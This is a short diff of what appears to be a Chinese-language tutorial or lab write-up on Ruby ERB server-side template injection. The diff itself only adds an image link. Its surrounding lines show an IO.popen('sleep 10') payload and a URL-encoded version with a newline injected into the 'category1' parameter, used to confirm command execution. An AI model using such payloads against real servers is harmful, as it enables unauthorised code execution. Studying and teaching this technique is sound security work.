@@ -94,6 +94,7 @@ test
 <%= IO.popen("sleep 10").readlines() %>
 ```
 #### 此有效负载将导致服务器执行sleep 10命令，使页面挂起10秒钟。如果页面确实挂起，则表明注入成功。
+![时间真的在过节](images/09210204.png)
 #### 在Repeater窗口中，我们修改拦截的请求，将有效载荷包含在参数category1，确保对其进行url编码。我们手动包含换行符通过使用其url编码%0A：
 ```
 test%0A<%25%3d+IO.popen("sleep+10").readlines()%25>
